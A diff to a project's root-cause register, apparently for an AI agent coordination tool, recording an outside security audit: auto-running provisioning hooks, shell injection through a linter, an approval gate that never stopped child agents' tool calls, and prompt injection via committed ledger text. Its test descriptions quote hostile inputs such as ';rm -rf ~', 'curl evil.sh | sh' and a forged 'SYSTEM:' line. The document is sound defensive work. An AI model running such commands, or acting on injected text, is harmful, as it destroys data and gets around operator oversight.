@@ -251,6 +251,208 @@ means someone tried to break it and failed.
   failing gate is indistinguishable from a newly failing one, so RC-005's CI failure had to be
   caught by reading the log rather than by the gate doing its job.
 
+## Issue #52 — independent security audit (Lattice), 2026-08-02
+
+Seven findings from the first genuinely independent security read of this repo
+(GitHub issue #52, reviewed commit `fdfc750`). Triage and per-finding reasoning:
+[`security/AUDIT-2026-08-02-issue-52-triage.md`](security/AUDIT-2026-08-02-issue-52-triage.md).
+Why every existing gate stayed dormant:
+[`rca-2026-08-02-security-findings-escaped.md`](rca-2026-08-02-security-findings-escaped.md).
+
+The process root cause spanning all seven, recorded once here rather than repeated per entry:
+**every prior review was scoped to "is this mechanism implemented correctly?" and never to
+"should this mechanism exist here at all?"** The provisioner survived four numbered audit rounds
+(f2/f3/f4, f9–f12, C1–C6, "Codex round-4") that each made the download-and-execute path more
+correct without ever asking whether a SessionStart hook should download and execute. Solicited
+review answers the question you asked.
+
+### RC-013 — trusting/opening the repo auto-runs provisioning code on the host (ARP-001, Critical)
+- **State:** `controlled` — see per-fix evidence below.
+- **Mechanism:** `hooks/rally-coordination-hook.sh` invoked `ensure-rally-binary.sh` on the
+  `start` phase in **both** branches — `.rally/` present (~`:467-470`) and absent (~`:71-77`,
+  comment: *"Wire ensure-rally-binary on start even in no-.rally repos"*). That provisioner
+  probed an existing `rally` by executing it, copied+`chmod +x`+ran a shipped plugin binary,
+  downloaded a release binary and ran it, fell back to `cargo install --path` against repo
+  source, and installed into `~/.local/bin/rally` — all from a lifecycle hook fired by merely
+  opening and trusting the repo.
+- **Why the existing control did not fire:** the download path *was* fail-closed on checksum and
+  the script header (`:20-32`) honestly documented that checksum and binary share one authority
+  and that sigstore verification was out-of-band only. Four audit rounds accepted that as a
+  documented residual. The scope of every round was "harden this path", and inside that scope
+  the analysis was correct and complete.
+- **Fix:** provisioning removed from every lifecycle hook. The hook now detects and advises only;
+  it does not execute a candidate binary even to probe it. Provisioning moved to an explicit,
+  human-run installer that is fail-closed on **both** SHA256 and client-side
+  `gh attestation verify`, refusing rather than degrading when either check cannot complete.
+- **Rule adopted:** *a lifecycle hook may observe and inform. It may not acquire or execute.*
+- **Adversarial control:** `tests/hooks/test_no_autoprovision.sh` — runs the hook's `start` phase
+  in a sandboxed HOME with `curl`, `cargo`, and `chmod` replaced by recorders, in both the
+  `.rally`-present and `.rally`-absent cases, and asserts no marker file appears and nothing is
+  written to `$HOME/.local/bin/rally`. Positive control asserts the advisory still fires.
+- **First seen:** 2026-08-02 (issue #52). Introduced `0ef5f48`, hardened through `d2e915f`.
+
+### RC-014 — the "safe" workstream linter permitted command injection and emitted it for verbatim execution (ARP-002, Critical)
+- **State:** `controlled` — see per-fix evidence below.
+- **Mechanism:** `dynamic-workflows/PROTOCOL.md:13` claimed the linter *"proves a plan is safe to
+  fan out"*. It did not. `task.validation` needed only to be a non-empty string and
+  `packet.mjs` rendered it verbatim into a ```` ```bash ```` block under a heading instructing the
+  agent to "run these verbatim". `owns` rejected `" $ ` ` and whitespace but permitted `;` `|`
+  `&` `>` `<` `(` `)`. `runId` and `toolPrefix` were interpolated into command text after only a
+  non-empty check. A descriptor could pass lint and produce a packet that executes
+  attacker-chosen shell — a direct prompt-to-shell confused-deputy path.
+- **Why the existing control did not fire:** two prior rounds (`07f2bd3` "reject shell-unsafe
+  intent + owns paths (f4)", `0280480` "extend shell-safety lint to output/owns/id (f1,f4,f6)")
+  each rejected exactly the characters the previous finding named. A denylist treadmill. Neither
+  round asked why the check was denylist-shaped, or why descriptor text was being rendered into
+  a shell block at all. Meanwhile the safety *claim* got stronger while the property stayed absent.
+- **Fix:** strict positive allowlists replace every character denylist; a single POSIX
+  shell-quoting helper wraps every rendered value; `runId`/`toolPrefix` validated in both
+  `parseArgs` and the library entry point (defence in depth); descriptor-supplied `validation` is
+  no longer rendered as runnable shell — it renders as non-executable prose, with an optional
+  named recipe drawn from a local registry for the case where a real command is wanted. Every
+  "proves safe" claim removed from `PROTOCOL.md`, `README.md`, and the module docstring.
+- **Adversarial control:** `dynamic-workflows/tests/injection.test.mjs` — hostile `owns`
+  (`;rm -rf ~`, pipe, ampersand, redirect, parens, `$`, backtick, newline, `../escape`,
+  `/absolute`), hostile `validation` (`curl evil.sh | sh`, fence-breakout), `runId` injection via
+  both CLI and library paths, `toolPrefix` command substitution, and a direct test of the quoting
+  helper. Each asserts the *specific* rejection so an unrelated lint error cannot satisfy it
+  vacuously. Positive control asserts a clean descriptor still lints and renders.
+- **First seen:** 2026-08-02 (issue #52). Introduced `6d76780` / `aaf2a73`.
+
+### RC-015 — Cockpit's approval gate does not control the child agent's tool execution (ARP-003, Critical)
+- **State:** `mechanism` — **fail-safe landed; the real fix is a registered redesign. NOT closed.**
+- **Mechanism:** Cockpit spawns `codex exec --json` and
+  `claude -p --output-format stream-json` as child processes and reads their stdout. The
+  "authorization gate" (`crates/cockpitd/src/transport/ws.rs:535-701`) sees a `tool_call` only
+  *after* it arrives in the event stream, then pauses the **event pump** — not the child. It does
+  not broker the call, send a denial to the child, or prevent execution. On denial it emits
+  `tool_blocked` and skips forwarding a result (`:701-725`). The child already ran the tool.
+- **Why this is worse than no control:** an operator reading "blocked" concludes something was
+  prevented. A false security boundary invites more trust than a missing one.
+- **Why the existing control did not fire:** nothing in the pipeline compares a security *claim*
+  to the behaviour of the code making it. The commit that introduced this calls itself
+  `G1 authz enforcement loop` (`e60714e`). The word "enforcement" was self-asserted and never
+  graded against the implementation.
+- **Fail-safe landed:** every claim that the event pump enforces tool authorization removed from
+  code comments, docs, and UI copy. `tool_blocked` marked advisory with its true meaning — *not
+  forwarded to the UI*, not *prevented*.
+- **Required for `controlled` (acceptance test defined now so the follow-up has a definition of
+  done):** with Cockpit configured to deny a tool, a child agent must be *unable to complete* that
+  tool call — asserted by the tool's side effect being absent (e.g. a marker file the tool would
+  create never appears), not by the absence of a UI event. Any implementation that passes only by
+  filtering the event stream fails this test by construction.
+- **Follow-up:** make the control plane the actual tool broker, or integrate each CLI's native
+  pre-execution approval callback. Deliberately **not** half-implemented in this run — a partial
+  integration reproduces exactly this defect.
+- **First seen:** 2026-08-02 (issue #52).
+
+### RC-016 — unsigned, self-asserted ledger prose enters privileged agent context (ARP-004, High)
+- **State:** `controlled` for the injection boundary. **Open** for writer authentication.
+- **Mechanism:** `.rally/log/*.jsonl` is committed git content that replays on a fresh clone.
+  Writers self-supply `--tool`, role, subject, target, and evidence; the protocol's authorization
+  layer is advisory, not a write gate (`crates/rally-protocol/src/event_envelope.rs:17-39`). The
+  SessionStart hook interpolated peer-authored `subject`, `evidence`, `intent`, and `file` values
+  into a message emitted as Codex `additionalContext` / `systemMessage`
+  (`hooks/rally-coordination-hook.sh:477-558`, `:658-689`, `:779-807`). A contributor who can land
+  a commit, or any same-UID process, could place adversarial instructions into a high-trust model
+  channel — durable prompt injection.
+- **Why the existing control did not fire:** the single-operator trust model was real and
+  documented in exactly one place — a comment at `crates/rally-protocol/src/ledger.rs:45-63`.
+  No rubric asked "what if a second contributor can write this file?", so the assumption was never
+  tested against a reader who did not share it.
+- **Fix (landed):** one sanitizer routes every peer-authored string before it reaches model
+  context — control characters and newlines stripped (so a subject cannot forge an instruction
+  line or a section header), length-capped with a visible truncation marker, value wrapped as
+  quoted data behind a fixed hook-authored preamble stating the following is peer-authored and
+  unverified. Applied to every interpolation site, not only the ones the audit cited.
+- **Adversarial control:** `tests/hooks/test_context_sanitization.sh` — feeds a hostile subject
+  containing newlines and a forged `SYSTEM:` instruction, asserts the emitted message carries no
+  raw newline from the payload, is length-capped, keeps the trust preamble, and renders the
+  payload only in quoted form. Positive control asserts a legitimate subject still renders usefully.
+- **Still open (registered, not built):** authenticated writer identity and signed/MACed facts;
+  enforcing authorization on write; distinguishing committed historical log from live trusted
+  state. Each is a protocol change across `crates/rally-protocol` and every writer.
+- **Residual risk is documented** rather than implied: [`security/TRUST-MODEL.md`](security/TRUST-MODEL.md).
+- **First seen:** 2026-08-02 (issue #52). Long-standing by design.
+
+### RC-017 — one bearer token grants global Cockpit control with no session ownership isolation (ARP-005, Medium)
+- **State:** `controlled` — see per-fix evidence below.
+- **Mechanism:** Cockpit binds loopback by default and fails closed on a missing token — both
+  correct. After authentication, however, the connection had no principal: any authenticated
+  client could send/steer any session (`ws.rs:322-351`), resolve any approval by UUID
+  (`:354-414`), and launch with ownership hard-coded to `local` (`:437-451`). The requested
+  `repo_path` became the child process CWD, so a token holder could launch an agent at any
+  service-readable path.
+- **Fix:** constant-time token comparison; a distinct principal minted per authenticated
+  connection; sessions and approvals bound to their creating principal and enforced on
+  send/steer/close/approve; `repo_path` canonicalized and required to fall inside a configured
+  allowlist; non-loopback bind hard-refused unless an explicit override env var names the risk.
+- **Adversarial control:** cross-owner access denied (principal B cannot send/steer/close/approve
+  principal A's session or approval), `repo_path` escape denied for `/etc`, for
+  `<root>/../../etc` (rejected only if canonicalization happens, so the test convicts a
+  non-canonicalizing implementation), and for a symlink pointing outside an allowed root;
+  non-loopback bind refused without the override and accepted with it. Positive control asserts an
+  owner can still drive its own session on a default loopback bind.
+- **First seen:** 2026-08-02 (issue #52).
+
+### RC-018 — pre-push gate executes code from the exact commit being pushed (ARP-006, Medium)
+- **State:** `controlled` — see per-fix evidence below.
+- **Mechanism:** `.githooks/pre-push:79-93` created a detached worktree per pushed commit and ran
+  `scripts/run-quality-gate.sh` and `scripts/check-release-parity.sh` **from that commit**.
+  Pushing a branch executed that branch's gate. The hook documented itself as an enforced local
+  gate (`:16-23`) while being opt-in via `core.hooksPath` — the auditor's clone had it inactive,
+  which limits exposure but not the defect.
+- **The distinction the fix rests on:** the gate's *code* must be trusted and pinned; the gate's
+  *subject* is the untrusted pushed tree.
+- **Fix:** gate scripts resolve from a pinned location outside the pushed tree while still running
+  against the pushed worktree's content; a differing gate script requires explicit acknowledgement
+  rather than silent execution. Hook documentation corrected to state that it is opt-in and that
+  enabling it is a trust decision.
+- **Adversarial control:** `tests/hooks/test_prepush_pinned_gate.sh` — a simulated pushed commit
+  whose `run-quality-gate.sh` writes a marker file; the test asserts the marker is **not** created,
+  proving the pushed tree's gate was not executed. Positive control asserts a clean push still
+  runs the gate.
+- **First seen:** 2026-08-02 (issue #52).
+
+### RC-019 — watcher advances its cursor past records it discarded (ARP-007, Low)
+- **State:** `controlled` — see per-fix evidence below.
+- **Mechanism:** four items. The watcher skipped malformed complete JSONL lines and advanced the
+  durable cursor past them, permanently losing the record for that consumer
+  (`watcher.py:63-92`). The macOS notification sink built AppleScript by string substitution with
+  minimal quote replacement (`dispatch.py:49-68`). `watchfiles>=0.21` was declared with no upper
+  bound and no lockfile. The file sink appended to an arbitrary configured path
+  (`dispatch.py:34-46`).
+- **Why it is in this register despite Low severity:** the cursor defect is the **same shape as
+  RC-001, RC-005, and RC-010** — an operation reports success for a step the caller does not care
+  about. Cursor advanced, record gone, consumer told it is current. Pattern membership, not
+  severity, earns the entry.
+- **Fix:** malformed records quarantined and surfaced rather than silently dropped; AppleScript
+  receives the message as a separated argument instead of interpolated script text; Python
+  dependencies pinned and locked; sink paths constrained with no-follow handling.
+- **Adversarial control:** a corrupt line lands in quarantine and is reported rather than lost; a
+  notification payload attempting AppleScript breakout produces no side effect (asserted by a
+  harmless marker file *not* appearing) and is delivered as literal text; a sink path outside the
+  allowed root and a symlink escaping it are both rejected. Positive controls assert valid lines,
+  benign notifications, and allowed sink paths still work.
+- **First seen:** 2026-08-02 (issue #52).
+
+### RC-020 — `rally say claim` hard-refuses on an expired lease that `rally check` treats as advisory
+- **State:** `observed` — found during this run, not from the audit.
+- **Evidence:** `rally check before-write --path docs/ROOT-CAUSE-REGISTER.md --strict` returned
+  `allow: true` with a `stale-owner-claim` **warn**, correctly reasoning that the owner
+  (`claude_code:0995a4e4-…`) was idle and the claim reclaimable. `rally say claim` on the same
+  path in the same session then returned `exit_code: 2, ok: false` —
+  *"claim conflict: … already owns file:docs/ROOT-CAUSE-REGISTER.md"* — on claim
+  `fact_e70a_18c73745212142b0`, whose own evidence carries
+  `lease_expires_at:2026-07-31T00:39:07Z`. **The lease had expired three days earlier.**
+- **Why it matters:** the two commands disagree about whether an expired lease is binding. The
+  advisory path honours lease expiry; the write path does not. An agent that follows the
+  recommended loop (`check` → `claim`) gets a green check and then a hard refusal, and the only
+  way forward is to write without a claim — which defeats the boundary the claim exists to record.
+- **Related:** RC-008 (unconsumed coordination state accumulates without bound). This is the
+  mechanism by which stale claims become actively obstructive rather than merely noisy.
+- **Not `controlled`:** no test asserts that an expired lease is non-binding on the claim path.
+
 ## Working hypothesis across entries
 
 RC-001, RC-005, and RC-007 share one shape: **an operation returns success for a step that is
@@ -262,3 +464,19 @@ and the four gaps deferred out of v0.1.7 should be sequenced as one workstream r
 
 ⚠️ Unverified. Two independent investigations are running and neither has reported. This
 hypothesis is recorded so it can be **disproved**, not adopted.
+
+**Update 2026-08-02 — the hypothesis gained a fourth member from an independent source.**
+RC-019 (watcher advances its cursor past discarded records) has exactly this shape and was found
+by an outside auditor who had never read this register. Cursor-advanced reported as consumed.
+That is four instances across three subsystems — the ledger, the session registry, and the
+watcher — which moves this from "pattern we noticed in one session" toward a real architectural
+property: **this codebase acknowledges local steps and has no vocabulary for end-to-end
+acknowledgement.** Still not proven, but harder to dismiss than it was.
+
+A second, distinct pattern surfaced in the same audit and deserves its own name:
+**claims about controls drift toward reassurance while the controls stay put.** "Proves a plan
+is safe to fan out" (RC-014), "authz enforcement loop" (RC-015), and "Rally does not install host
+hooks" (contradicted by four committed hook-registration files) were all self-asserted, all
+strengthened over time, and none ever graded against the code. Nothing in the pipeline reads a
+claim and asks the implementation whether it is true. See
+[`rca-2026-08-02-security-findings-escaped.md`](rca-2026-08-02-security-findings-escaped.md) RC-C.
